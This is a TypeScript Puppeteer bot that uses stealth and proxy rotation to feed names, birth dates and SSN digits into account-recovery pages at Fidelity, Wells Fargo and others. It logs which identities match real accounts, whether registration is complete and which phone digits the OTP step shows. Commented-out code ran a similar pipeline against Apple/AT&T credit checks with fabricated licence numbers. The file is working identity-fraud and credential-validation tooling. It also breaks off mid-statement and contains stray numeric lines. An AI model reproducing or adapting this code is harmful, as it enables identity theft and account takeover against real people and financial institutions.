import axios from 'axios';
import { Browser } from 'puppeteer';
import puppeteerExtra from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';

import { Credential } from './interface/credential';
import {
  LOAN_AMOUNTS,
  TIMEOUT_WAIT_DEFAULT,
  TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES,
  TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES,
  TIMEOUT_WAIT_FOR_RESPONSE_APPLE_MINUTES,
} from './constants';
import {
  generateOutputMessage,
  getRamdomValue,
  minutesToMilliseconds,
} from './utils';
import path from 'path';
import fs from 'fs';
import logger from './logger/logger';
import { generateRandomNumberWithPrefix } from './utils/generate-random-number-with-prefix';
import { CreditCheckResponse } from './api/apple/interfaces/CreditCheckResponse';
import { ValidateAddresResponse } from './api/apple/interfaces/ValidateAddresResponse';
import { DownPaymentResponse } from './api/apple/interfaces/DownPaymentResponse';
import { FidelitySearchResponse } from './api/fidelity/FidelitySearchResponse';
import { getBotConfig } from './utils/get-bot-config';
import { FidelityResponseMessages } from './api/fidelity/FidelityResponseMessages';

puppeteerExtra.use(StealthPlugin());

const isPkg = typeof process.pkg !== 'undefined';

console.log({ isPkg });

export const TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS = minutesToMilliseconds(
  TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES,
);

export const TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MILLISECONDS =
  minutesToMilliseconds(TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES);

export const TIMEOUT_WAIT_FOR_RESPONSE_APPLE = minutesToMilliseconds(
  TIMEOUT_WAIT_FOR_RESPONSE_APPLE_MINUTES,
);

export const TIMEOUT_DEFAULT = minutesToMilliseconds(TIMEOUT_WAIT_DEFAULT);

export const SCREENSHOT_DISABLED = true;

const logTracking = (message: string, email: string) => {
  logger.warn(`${message} || ${email}`);
};

const getLoanAmountValue = () =>
  LOAN_AMOUNTS[getRamdomValue(0, LOAN_AMOUNTS.length - 1)];

enum DriverLicenceState {
  AZ = 'AZ',
  DE = 'DE',
}

const getDriverLicense = (state: DriverLicenceState) => {
  switch (state) {
    case DriverLicenceState.DE:
      return generateRandomNumberWithPrefix('0', 6);
    case DriverLicenceState.AZ:
      let prefixList = ['A', 'B', 'D', 'R'];

      let prefix = prefixList[getRamdomValue(0, prefixList.length - 1)];

      return generateRandomNumberWithPrefix(prefix, 8);

    default:
      return generateRandomNumberWithPrefix('0', 6);
  }
};

const formatBid = (bid: string) => {
  const bidDate = new Date(bid);

  bidDate.setMinutes(bidDate.getMinutes() + bidDate.getTimezoneOffset());

  return new Intl.DateTimeFormat('en-US', {
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
  }).format(bidDate);
};

interface PageConfiguration {
  pageUrl: string;
  loanAmountSelector: string;
  formSelector: string;
}

interface ConfigurationPerPage {
  xfinity: PageConfiguration;
  pilotflyingj: PageConfiguration;
  apple: PageConfiguration;
  fidelity: PageConfiguration;
  wfVerify: PageConfiguration;
}

const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
  xfinity: {
    pageUrl: 'https://login.xfinity.com/login',
    loanAmountSelector: '#amount',
    formSelector: '#homepage-form',
  },
  pilotflyingj: {
    pageUrl: 'https://loyaltyportal.pilotflyingj.com/myrewards/login',
    loanAmountSelector: '#amount',
    formSelector: '#homepage-form',
  },
  apple: {
    pageUrl:
      'https://www.apple.com/shop/buy-iphone/iphone-15-pro/6.7-inch-display-256gb-blue-titanium-att',
    loanAmountSelector: '#amount',
    formSelector: '#homepage-form',
  },
  fidelity: {
    pageUrl:
      'https://nb.fidelity.com/public/nbpreloginnav/app/forgotlogindomestic',
    loanAmountSelector: '#amount',
    formSelector: '#homepage-form',
  },
  wfVerify: {
    pageUrl: 'https://oam.wellsfargo.com/oamo/identity/help/passwordhelp#/',
    loanAmountSelector: '#amount',
    formSelector: '#homepage-form',
  },
};

const generateInputNameSelector = (name: string) => `[name=${name}]`;

const API_URLS = {
  apple: {
    validateAddress: '/preauth/api/validate-address',
    // validateAddress:
    //   '/WebObjects/IPACustomer.woa/wa/IPAPreAuthAction/api/validate-address',
    // creditCheck:
    //   '/WebObjects/IPACustomer.woa/wa/IPAPreAuthAction/api/credit-check',
    creditCheck: '/preauth/api/credit-check',
    downPayment: '/preauth/api/down_payment',
    // downPayment:
    //   '/WebObjects/IPACustomer.woa/wa/IPAPreAuthAction/api/down_payment',
  },
  fidelity: {
    search: 'https://ecaap.fidelity.com/user/identity/attributes/.search',
    status: 'https://ecaap.fidelity.com/user/factor/password/status',
    login: 'https://ecaap.fidelity.com/user/session/login',
  },
};

const SELECTORS = {
  firstName: '#personFirstName',
  lastName: '#personLastName',
  month: '#dob-month-input',
  day: '#dob-day-input',
  year: '#dob-year-input',
  last4ssn: '#lastFourOfSSN',
  continue_button: 'button[type=submit]',
  ssn: '#ssn',
  dob: '#dob',
  phoneImageModal: 'div.ResponsiveModalListContent__normalInset____tNPh',
  // phoneImageModal:
  //   '#app-modal-root > div:nth-child(5) > div > div > div > div > div > div > div > div.Dimensions__dimensions___ev7C8.ResponsiveModalContent__dimensions___TGRVM > div > div:nth-child(2) > div.ResponsiveModalListContent__normalInset____tNPh',
  errorMessage:
    '#root > div > div > div:nth-child(2) > div > div > div > div:nth-child(1) > div > div > div > div.Identification__messageContainer___mTsX8 > div > div',
};

// [...document.querySelectorAll("input[name=planSelection]")][1].click()

const getIP = async () => {
  try {
    const botConfig = await getBotConfig();

    const proxyConfig = {
      host: botConfig.proxy.split(':')[0],
      port: botConfig.proxy.split(':')[1],
    };

    const { data: ip } = await axios.get<string>('http://api.ipify.org', {
      timeout: 5000,
      proxy: {
        protocol: 'http',
        host: proxyConfig.host,
        port: Number(proxyConfig.port),
      },
    });
    return ip;
  } catch (error) {
    logger.error(error);
    // defualt ip when request fails
    return '127.0.0.1';
  }
};

const validateIp = async (
  ip: string,
  pageConfigKey: keyof ConfigurationPerPage,
) => {
  const dirname = process.cwd();

  const IPs_Directory = path.join(`${dirname}/data/ips`);

  if (!fs.existsSync(IPs_Directory)) {
    fs.mkdirSync(IPs_Directory, { recursive: true });
  }

  const readFile = async () => {
    if (!fs.existsSync(`${IPs_Directory}/${pageConfigKey}.txt`)) {
      fs.writeFileSync(`${IPs_Directory}/${pageConfigKey}.txt`, '', 'utf8');
    }

    const fileContent = await fs.promises.readFile(
      `${IPs_Directory}/${pageConfigKey}.txt`,
      'utf8',
    );

    return fileContent;
  };

  const fileData = await readFile();

  const ipsData = fileData ? fileData.split(/\n/).filter(Boolean) : [];

  const isIPUsed = [...ipsData, '127.0.0.1'].includes(ip);

  if (!isIPUsed) {
    logger.warn(`New IP: ${ip}`);

    ipsData.push(ip);

    fs.writeFileSync(
      `${IPs_Directory}/${pageConfigKey}.txt`,
      ipsData.join('\n'),
      'utf8',
    );
  }

  return isIPUsed;
};

// export const getCredentialInformationScrapper = async (
//   credential: Credential,
//   validWriteLineOnFile: (line: string) => void,
//   invalidWriteLineOnFile: (line: string) => void,
//   validFileName: string,
//   pageConfigKey: keyof ConfigurationPerPage,
// ) => {
//   const botConfig = await getBotConfig();

//   const HEADLESS = botConfig.openBrowser === 'yes' ? false : 'new';

//   const proxyConfig = {
//     host: botConfig.proxy.split(':')[0],
//     port: botConfig.proxy.split(':')[1],
//   };

//   const { pageUrl } = CONFIGURATION_PER_PAGE[pageConfigKey];

//   const chromiumExecutablePath = isPkg
//     ? puppeteerExtra
//         .executablePath()
//         .replace(
//           /^.*?\/node_modules\/puppeteer\/\.local-chromium/,
//           path.join(path.dirname(process.execPath), '.local-chromium'),
//         )
//     : puppeteerExtra.executablePath();

//   let _browser = await puppeteerExtra.launch({
//     headless: HEADLESS,
//     executablePath: chromiumExecutablePath,
//     // headless: false,
//     // args: ['--proxy-server=162.244.132.210:6021'],
//     args: [
//       `--proxy-server=${proxyConfig.host}:${proxyConfig.port}`,
//       '--no-sandbox',
//     ],
//   });

//   // const page = await browser.newPage();
//   let page = await _browser.newPage();

//   page.setDefaultTimeout(TIMEOUT_DEFAULT);

//   await page.setViewport({
//     width: 400,
//     height: 634,
//   });

//   // await page.setRequestInterception(true);

//   // page.on('request', (request) => {
//   //   if (['image', 'font'].indexOf(request.resourceType()) !== -1) {
//   //     // console.log('###Aborting non essential request to speed up site...');
//   //     request.abort();
//   //   } else {
//   //     request.continue();
//   //   }
//   // });

//   let ip = '';

//   let isInvalidIp = false;

//   try {
//     await page.goto(pageUrl, {
//       // waitUntil: 'domcontentloaded',
//       waitUntil: 'networkidle2',
//       timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
//     });

//     while (isInvalidIp) {
//       ip = await getIP();

//       isInvalidIp = await validateIp(ip, pageConfigKey);

//       if (isInvalidIp) {
//         console.log(`CURRENT IP: ${ip}`);
//       }

//       await _browser.close();

//       _browser = await puppeteerExtra.launch({
//         headless: HEADLESS,
//         // headless: false,
//         args: [`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`],
//       });

//       page = await _browser.newPage();

//       page.setDefaultTimeout(TIMEOUT_DEFAULT);

//       await page.setViewport({
//         width: 1920 / 1.5,
//         height: 1080 / 1.5,
//       });

//       await page.goto(pageUrl, {
//         waitUntil: 'networkidle2',
//         timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
//       });

//       await new Promise((r) => setTimeout(r, 3000));
//     }

//     // console.log('out of loop');
//     const dirname=process.cwd();

//     console.log({ dirname });

//     const screenshotRedirectDirectory = path.join(
//       `${dirname}/data/screenshots-redirect/${validFileName}`,
//     );

//     if (!fs.existsSync(screenshotRedirectDirectory)) {
//       fs.mkdirSync(screenshotRedirectDirectory, { recursive: true });
//     }

//     const screenshotRedirectPath = path.join(
//       `${screenshotRedirectDirectory}/${credential.ssn}.png`,
//     );

//     // await page.select(loanAmountSelector, loanAmountValue);

//     // await page.waitForSelector(SELECTORS.paymentOptions.finance);

//     // await page.evaluate((SELECTORS) => {
//     //   const element = document?.querySelector(
//     //     SELECTORS.paymentOptions.finance,
//     //   ) as HTMLInputElement | null;

//     //   if (element) {
//     //     element.click();
//     //   }
//     // }, SELECTORS);

//     // await page.waitForSelector(SELECTORS.paymentOptions.carrier);

//     // await page.evaluate((SELECTORS) => {
//     //   const element = document?.querySelector(
//     //     SELECTORS.paymentOptions.carrier,
//     //   ) as HTMLInputElement | null;

//     //   if (element) {
//     //     element.click();
//     //   }
//     // }, SELECTORS);

//     // await page.waitForSelector(SELECTORS.paymentOptions.att);

//     // await page.evaluate((SELECTORS) => {
//     //   const element = document?.querySelector(
//     //     SELECTORS.paymentOptions.att,
//     //   ) as HTMLInputElement | null;

//     //   if (element) {
//     //     element.click();
//     //   }
//     // }, SELECTORS);

//     // await new Promise((r) => setTimeout(r, 1500));

//     // await page.waitForSelector(SELECTORS.paymentOptions.no_apple_care);

//     // await page.evaluate((SELECTORS) => {
//     //   const element = document?.querySelector(
//     //     SELECTORS.paymentOptions.no_apple_care,
//     //   ) as HTMLInputElement | null;

//     //   if (element) {
//     //     element.click();
//     //     element.click();
//     //   }
//     // }, SELECTORS);

//     // await new Promise((r) => setTimeout(r, 2000));

//     // await page.waitForSelector(SELECTORS.paymentOptions.continue_button);

//     // await page.evaluate((SELECTORS) => {
//     //   const element = document?.querySelector(
//     //     SELECTORS.paymentOptions.continue_button,
//     //   ) as HTMLInputElement | null;

//     //   if (element) {
//     //     element.click();
//     //   }
//     // }, SELECTORS);

//     // await Promise.all([
//     //   // await page.click(SELECTORS.submitButton),
//     //   await page.waitForNavigation({
//     //     timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
//     //     waitUntil: 'domcontentloaded',
//     //   }),
//     // ]);

//     // await page.waitForSelector(SELECTORS.att_apply_page.newCustomer);

//     // await page.evaluate((SELECTORS) => {
//     //   const element = document?.querySelector(
//     //     SELECTORS.att_apply_page.newCustomer,
//     //   ) as HTMLInputElement | null;

//     //   if (element) {
//     //     element.click();
//     //   }
//     // }, SELECTORS);

//     // await page.waitForSelector(SELECTORS.att_apply_page.continue_button);

//     // await page.evaluate((SELECTORS) => {
//     //   const element = document?.querySelector(
//     //     SELECTORS.att_apply_page.continue_button,
//     //   ) as HTMLInputElement | null;

//     //   if (element) {
//     //     element.click();
//     //   }
//     // }, SELECTORS);

//     // // await page.waitForNetworkIdle();

//     // // console.log('ready to set data on form!');

//     // await page.waitForSelector(SELECTORS.apple_form.firstName);

//     // const driverLicenceGenerated = getDriverLicense(
//     //   credential.state as DriverLicenceState,
//     // );

//     const date = new Date(credential.bid);

//     const month =
//       String(date.getMonth()).length === 1
//         ? '0' + String(date.getMonth())
//         : String(date.getMonth());

//     const day =
//       String(date.getDay()).length === 1
//         ? '0' + String(date.getDay())
//         : String(date.getDay());

//     console.log({
//       getMonth: date.getMonth(),
//       getDay: date.getDay(),
//       getFullYear: date.getFullYear(),
//       month,
//       day,
//     });

//     let newBid = Intl.DateTimeFormat('en-US', {
//       year: 'numeric',
//       month: '2-digit',
//       day: '2-digit',
//       timeZone: 'GMT',
//     }).format(new Date(credential.bid));

//     console.log({ newBid });

//     console.log('ssn', credential.ssn);
//     await page.waitForSelector(SELECTORS.ssn);
//     await page.type(SELECTORS.ssn, credential.ssn);

//     await new Promise((r) => setTimeout(r, 900));

//     await page.click(SELECTORS.continue_button);

//     await new Promise((r) => setTimeout(r, 1500));

//     console.log('dob', newBid);
//     await page.waitForSelector(SELECTORS.dob);
//     await page.type(SELECTORS.dob, newBid);

//     await Promise.all([await page.click(SELECTORS.continue_button)]);

//     // const URLIdentityDob =
//     //   'https://oam.wellsfargo.com/oamo/identity/help/passwordReset/identifyCustomerDob';

//     // const finalResponse = await page.waitForResponse(
//     //   (response) =>
//     //     response.url().includes(URLIdentityDob) && response.status() === 200,
//     // );

//     // console.log({ finalResponse });

//     // await new Promise((r) => setTimeout(r, 4000));

//     await page.waitForSelector(SELECTORS.phoneImageModal, {
//       timeout: 12000,
//     });

//     await new Promise((r) => setTimeout(r, 1000));

//     const phoneImageModal = await page.$(SELECTORS.phoneImageModal);

//     console.log({ phoneImageModal });

//     if (phoneImageModal) {
//       const outputMessage = generateOutputMessage(credential);

//       logger.info(outputMessage);

//       validWriteLineOnFile(outputMessage);
//     } else {
//       const outputMessage = generateOutputMessage(credential);

//       logger.error(outputMessage);

//       invalidWriteLineOnFile(outputMessage);
//     }

//     // await page.type(SELECTORS., String(date.getFullYear()));
//     // await page.type(SELECTORS.apple_form.lastName, credential.lastname);
//     // await page.type(SELECTORS.apple_form.email, credential.email);
//     // await page.type(SELECTORS.apple_form.addressLine1, credential.address);
//     // await page.type(SELECTORS.apple_form.addressState, credential.state);
//     // await page.type(SELECTORS.apple_form.city, credential.city);
//     // await page.type(SELECTORS.apple_form.idState, credential.state);
//     // await page.type(SELECTORS.apple_form.zipcode, credential.zipCode);
//     // await page.type(SELECTORS.apple_form.phonenumber, credential.phoneNumber);
//     // await page.type(SELECTORS.apple_form.idnumber, driverLicenceGenerated);
//     // await page.type(SELECTORS.apple_form.idState, credential.state);

//     // console.log(formatBid(credential.bid));

//     // await page.type(
//     //   SELECTORS.apple_form.dateOfBirth,
//     //   formatBid(credential.bid),
//     // );

//     // await page.type(SELECTORS.apple_form.socialSecurity, credential.ssn);

//     // await page.waitForSelector(SELECTORS.apple_form.continue_button);

//     // await page.click(SELECTORS.apple_form.continue_button);

//     // const originURL = new URL(page.url()).origin;

//     // const validateAddressResponse = (await (
//     //   await page.waitForResponse(originURL + API_URLS.apple.validateAddress, {
//     //     timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
//     //   })
//     // ).json()) as ValidateAddresResponse;

//     // if (validateAddressResponse.data.globalAddress.matchStatus === 'EXACT') {
//     //   //GOOOOOD

//     //   console.log('GOOD Address');
//     // } else {
//     //   console.log('suggested Address');

//     //   await page.waitForSelector(SELECTORS.apple_form.suggestedAddressButton);

//     //   await new Promise((r) => setTimeout(r, 1500));

//     //   await page.click(SELECTORS.apple_form.suggestedAddressButton);
//     // }

//     // const creditCheckResponse = (await (
//     //   await page.waitForResponse(originURL + API_URLS.apple.creditCheck, {
//     //     timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
//     //   })
//     // ).json()) as CreditCheckResponse;

//     // if (creditCheckResponse.nextPage === 'getInstallmentPlans') {
//     //   //GOOOOOD

//     //   console.log('GOOD CREDIT');

//     //   await page.waitForSelector(SELECTORS.apple_plan.installmentPlans);

//     //   const installmentPlansElements = await page.$$(
//     //     SELECTORS.apple_plan.installmentPlans,
//     //   );

//     //   await installmentPlansElements[1].click();

//     //   await new Promise((r) => setTimeout(r, 1500));

//     //   await page.waitForSelector(SELECTORS.apple_plan.continue_button);

//     //   await page.click(SELECTORS.apple_plan.continue_button);

//     //   await page.waitForSelector('[name=portin-type]');

//     //   await page.evaluate(() => {
//     //     (
//     //       document.querySelectorAll('[name=portin-type]')[1] as HTMLInputElement
//     //     )?.click();
//     //   });

//     //   await new Promise((r) => setTimeout(r, 1500));

//     //   // button continue click after select number
//     //   await page.waitForSelector(
//     //     SELECTORS.apple_plan.continue_button_number_plan,
//     //   );

//     //   await page.click(SELECTORS.apple_plan.continue_button_number_plan);

//     //   await page.waitForSelector(SELECTORS.apple_plan.installmentPlans);

//     //   const installmentPlansWirelessElements = await page.$$(
//     //     SELECTORS.apple_plan.installmentPlans,
//     //   );

//     //   await installmentPlansWirelessElements[2].click();

//     //   await new Promise((r) => setTimeout(r, 1500));

//     //   await page.waitForSelector(SELECTORS.apple_plan.continue_button_wireless);

//     //   await page.click(SELECTORS.apple_plan.continue_button_wireless);

//     //   const originDownPaymentURL = new URL(page.url()).origin;

//     //   const downPaymentResponse = (await (
//     //     await page.waitForResponse(
//     //       originDownPaymentURL + API_URLS.apple.downPayment,
//     //       {
//     //         timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
//     //       },
//     //     )
//     //   ).json()) as DownPaymentResponse;

//     //   ///               Down Payment validation block              ///
//     //   if (downPaymentResponse.data.downPayment === '$0') {
//     //     const outputMessage = generateOutputMessage(
//     //       credential,
//     //       page.url(),
//     //       driverLicenceGenerated,
//     //     );

//     //     logger.info(outputMessage);

//     //     validWriteLineOnFile(outputMessage);
//     //   } else {
//     //     const outputMessage = generateOutputMessage(
//     //       credential,
//     //       page.url(),
//     //       driverLicenceGenerated,
//     //       downPaymentResponse.data.downPayment,
//     //     );

//     //     logger.error(outputMessage);

//     //     invalidWriteLineOnFile(outputMessage);
//     //   }
//     //   ///               Down Payment validation block              ///
//     // } else {
//     //   const outputMessage = generateOutputMessage(
//     //     credential,
//     //     page.url(),
//     //     driverLicenceGenerated,
//     //   );

//     //   logger.error(outputMessage);

//     //   invalidWriteLineOnFile(outputMessage);
//     // }

//     // // await Promise.all([
//     // //   await page.click(SELECTORS.submitButton),
//     // //   await page.waitForNavigation({
//     // //     timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
//     // //     waitUntil: 'domcontentloaded',
//     // //   }),
//     // // ]);

//     // await new Promise((r) => setTimeout(r, 3000));

//     // // if (page.url().includes('home')) {
//     // //   const outputMessage = generateOutputMessage(credential, page.url(), ip);

//     // //   logger.info(outputMessage);

//     // //   validWriteLineOnFile(outputMessage);
//     // // } else {
//     // //   const outputMessage = generateOutputMessage(credential, page.url(), ip);

//     // //   logger.error(outputMessage);

//     // //   invalidWriteLineOnFile(outputMessage);
//     // // }

//     // if (SCREENSHOT_DISABLED) {
//     //   await page.screenshot({
//     //     path: screenshotRedirectPath,
//     //   });
//     // }
//   } catch (error) {
//     console.error(error);
//     logTracking(`ERROR WITH`, credential.ssn + ' !!');

//     logger.error(
//       `getCredentialInformationScrapper ERROR: ${error} || SSN:${
//         credential.ssn
//       } || URL: ${page.url()}`,
//     );
//   } finally {
//     await _browser.close();
//   }
// };

export const getCredentialInformationScrapper = async (
  credential: Credential,
  validWriteLineOnFile: (line: string) => void,
  invalidWriteLineOnFile: (line: string) => void,
  validFileName: string,
  pageConfigKey: keyof ConfigurationPerPage,
) => {
  const botConfig = await getBotConfig();

  const HEADLESS = botConfig.openBrowser === 'yes' ? false : 'new';

  const proxyConfig = {
    host: botConfig.proxy.split(':')[0],
    port: botConfig.proxy.split(':')[1],
  };

  const { pageUrl } = CONFIGURATION_PER_PAGE[pageConfigKey];

  // const chromiumExecutablePath = isPkg
  //   ? puppeteerExtra
  //       .executablePath()
  //       .replace(
  //         /^.*?\/node_modules\/puppeteer\/\.local-chromium/,
  //         path.join(path.dirname(process.execPath), '.local-chromium'),
  //       )
  //   : puppeteerExtra.executablePath();

  let _browser = await puppeteerExtra.launch({
    headless: HEADLESS,
    ignoreHTTPSErrors: true,
    // executablePath: chromiumExecutablePath,
    // headless: false,
    // args: ['--proxy-server=162.244.132.210:6021'],
    args: [
      `--proxy-server=${proxyConfig.host}:${proxyConfig.port}`,
      '--window-position=0,0',
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-accelerated-2d-canvas',
      '--no-zygote',
      '--renderer-process-limit=1',
      '--no-first-run',
      '--ignore-certificate-errors',
      '--ignore-certificate-errors-spki-list',
      '--disable-dev-shm-usage',
      '--disable-infobars',
      '--lang=en-US,en',
      '--window-size=1920x1080',
      '--disable-extensions',
      // '--user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3312.0 Safari/537.36"',
    ],
  });
44

3446361


101236

73461





  let page = await _browser.newPage();

  await page.emulateTimezone('Asia/Singapore');
  await page.setViewport({ width: 1920 / 2 - 21, height: 1080 - 111 });

  page.setDefaultTimeout(TIMEOUT_DEFAULT);

  // await page.setViewport({
  //   width: 1920 / 1.5,
  //   height: 1080 / 1.5,
  // });

  // await page.setRequestInterception(true);

  // page.on('request', (request) => {
  //   if (['image', 'font'].indexOf(request.resourceType()) !== -1) {
  //     // console.log('###Aborting non essential request to speed up site...');
  //     request.abort();
  //   } else {
  //     request.continue();
  //   }
  // });

  let ip = '';

  let isInvalidIp = false;

  try {
    await page.goto(pageUrl, {
      waitUntil: 'domcontentloaded',
      // waitUntil: 'networkidle0',
      timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
    });

    while (isInvalidIp) {
      ip = await getIP();

      isInvalidIp = await validateIp(ip, pageConfigKey);

      if (isInvalidIp) {
        console.log(`CURRENT IP: ${ip}`);
      }

      await _browser.close();

      _browser = await puppeteerExtra.launch({
        headless: HEADLESS,
        // headless: false,
        args: [`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`],
      });

      page = await _browser.newPage();

      page.setDefaultTimeout(TIMEOUT_DEFAULT);

      await page.setViewport({
        width: 1920 / 1.5,
        height: 1080 / 1.5,
      });

      await page.goto(pageUrl, {
        waitUntil: 'networkidle2',
        timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
      });

      await new Promise((r) => setTimeout(r, 3000));
    }

    // console.log('out of loop');

    const screenshotRedirectDirectory = path.join(
      `${__dirname}/data/screenshots-redirect/${validFileName}`,
    );

    if (!fs.existsSync(screenshotRedirectDirectory)) {
      fs.mkdirSync(screenshotRedirectDirectory, { recursive: true });
    }

    const screenshotRedirectPath = path.join(
      `${screenshotRedirectDirectory}/${credential.email}.png`,
    );

    // await page.select(loanAmountSelector, loanAmountValue);

    // await page.waitForSelector(SELECTORS.paymentOptions.finance);

    // await page.evaluate((SELECTORS) => {
    //   const element = document?.querySelector(
    //     SELECTORS.paymentOptions.finance,
    //   ) as HTMLInputElement | null;

    //   if (element) {
    //     element.click();
    //   }
    // }, SELECTORS);

    // await page.waitForSelector(SELECTORS.paymentOptions.carrier);

    // await page.evaluate((SELECTORS) => {
    //   const element = document?.querySelector(
    //     SELECTORS.paymentOptions.carrier,
    //   ) as HTMLInputElement | null;

    //   if (element) {
    //     element.click();
    //   }
    // }, SELECTORS);

    // await page.waitForSelector(SELECTORS.paymentOptions.att);

    // await page.evaluate((SELECTORS) => {
    //   const element = document?.querySelector(
    //     SELECTORS.paymentOptions.att,
    //   ) as HTMLInputElement | null;

    //   if (element) {
    //     element.click();
    //   }
    // }, SELECTORS);

    // await new Promise((r) => setTimeout(r, 1500));

    // await page.waitForSelector(SELECTORS.paymentOptions.no_apple_care);

    // await page.evaluate((SELECTORS) => {
    //   const element = document?.querySelector(
    //     SELECTORS.paymentOptions.no_apple_care,
    //   ) as HTMLInputElement | null;

    //   if (element) {
    //     element.click();
    //     element.click();
    //   }
    // }, SELECTORS);

    // await new Promise((r) => setTimeout(r, 2000));

    // await page.waitForSelector(SELECTORS.paymentOptions.continue_button);

    // await page.evaluate((SELECTORS) => {
    //   const element = document?.querySelector(
    //     SELECTORS.paymentOptions.continue_button,
    //   ) as HTMLInputElement | null;

    //   if (element) {
    //     element.click();
    //   }
    // }, SELECTORS);

    // await Promise.all([
    //   // await page.click(SELECTORS.submitButton),
    //   await page.waitForNavigation({
    //     timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
    //     waitUntil: 'domcontentloaded',
    //   }),
    // ]);

    // await page.waitForSelector(SELECTORS.att_apply_page.newCustomer);

    // await page.evaluate((SELECTORS) => {
    //   const element = document?.querySelector(
    //     SELECTORS.att_apply_page.newCustomer,
    //   ) as HTMLInputElement | null;

    //   if (element) {
    //     element.click();
    //   }
    // }, SELECTORS);

    // await page.waitForSelector(SELECTORS.att_apply_page.continue_button);

    // await page.evaluate((SELECTORS) => {
    //   const element = document?.querySelector(
    //     SELECTORS.att_apply_page.continue_button,
    //   ) as HTMLInputElement | null;

    //   if (element) {
    //     element.click();
    //   }
    // }, SELECTORS);

    // // await page.waitForNetworkIdle();

    // // console.log('ready to set data on form!');

    // await page.waitForSelector(SELECTORS.apple_form.firstName);

    // const driverLicenceGenerated = getDriverLicense(
    //   credential.state as DriverLicenceState,
    // );

    // const date = new Date(credential.bid);

    const [month, day, year] = new Intl.DateTimeFormat('en-US', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
    })
      .format(new Date(credential.bid))
      .split('/');

    console.log({
      month,
      day,
    });

    await page.waitForSelector(SELECTORS.firstName);
    await new Promise((r) => setTimeout(r, 2000));
    await page.type(SELECTORS.firstName, credential.name);
    await new Promise((r) => setTimeout(r, 2000));

    await page.type(SELECTORS.lastName, credential.lastname);
    await new Promise((r) => setTimeout(r, 2000));

    await page.select(SELECTORS.month, month);
    await new Promise((r) => setTimeout(r, 2000));

    await page.type(SELECTORS.day, day);
    await new Promise((r) => setTimeout(r, 2000));

    await page.type(SELECTORS.year, String(year));
    await new Promise((r) => setTimeout(r, 2000));

    await page.type(SELECTORS.last4ssn, credential.last4ssn);
    await new Promise((r) => setTimeout(r, 2000));

    await new Promise((r) => setTimeout(r, 2000));

    await page.click(SELECTORS.continue_button);

    // const validateSearchResponse = await (
    //   await page.waitForResponse(
    //     (res) => res.url() === API_URLS.fidelity.search,
    //     { timeout: 90_000 },
    //   )
    // ).json();

    const validateSearchResponse = (await (
      await page.waitForResponse(
        (res) =>
          res.url() === API_URLS.fidelity.search &&
          res.request().method() != 'OPTIONS',
        {
          timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
        },
      )
    ).json()) as FidelitySearchResponse;

    console.log(validateSearchResponse);

    // validate if not blocked
    if (validateSearchResponse?.responseBaseInfo?.status?.message) {
      const searchResponseMessage =
        validateSearchResponse.responseBaseInfo.status.message;

      logger.info(
        `PASSED! MESSAGE=${searchResponseMessage} NAME=${credential.name} SSN=${credential.ssn}`,
      );

      let outputMessage = generateOutputMessage({
        credential,
        searchResponseMessage,
      });

      // validate if user not found
      if (searchResponseMessage === FidelityResponseMessages.UserNotFound) {
        invalidWriteLineOnFile(outputMessage);

        logger.warn(
          `User NOT FOUND! MESSAGE=${searchResponseMessage} NAME=${credential.name} SSN=${credential.ssn}`,
        );

        throw new Error(
          `User NOT FOUND! MESSAGE=${searchResponseMessage} NAME=${credential.name} SSN=${credential.ssn}`,
        );
      }

      await page.waitForNetworkIdle();

      const possibleTittles = {
        OTP: 'Extra security step required',
        CompleteRegister: `We've verified your identity`,
      };

      // validate registration status
      const warningTitle = await (
        await page.$('div.fs-card__header h1')
      )?.evaluate((el) => el.textContent);

      const actionTitle = await (
        await page.$('.action-step__header')
      )?.evaluate((el) => el.textContent);

      if (warningTitle) {
        if (warningTitle.includes(possibleTittles.CompleteRegister)) {
          outputMessage = generateOutputMessage({
            credential,
            searchResponseMessage,
            isCompleteRegister: true,
          });

          logger.info(outputMessage);

          validWriteLineOnFile(outputMessage);

          return;
        }
      }

      if (actionTitle) {
        if (actionTitle.includes(possibleTittles.OTP)) {
          const phoneLast4Digit = await page.evaluate(() => {
            let phones = [
              ...document.querySelectorAll(
                `[aria-labelledby="group-3-label-call-me"] [pvd-name="2fa-code-option-group"]`,
              ),
            ]
              .map((phone) => phone.getAttribute('pvd-value') || '')
              .filter(Boolean);

            return phones;
          });

          outputMessage = generateOutputMessage({
            credential,
            searchResponseMessage,
            otp: true,
            phoneLast4Digit,
          });

          logger.info(outputMessage);

          validWriteLineOnFile(outputMessage);

          return;
        }
      }

      console.log({ warningTitle, actionTitle });

      // title selector "div.fs-card__header h1"
      // title selector "action-step__header"
    } else {
      const outputMessage = generateOutputMessage({
        credential,
        searchResponseMessage: 'BLOCKED',
      });

      invalidWriteLineOnFile(outputMessage);

      logger.error(`BLOCKED!  NAME=${credential.name} SSN=${credential.ssn}`);
    }
  } catch (error) {
    console.error(error);
    logTracking(
      `ERROR WITH ${credential.email}!!!`,
      `${credential.email} || url=${page.url()} `,
    );

    logger.error(
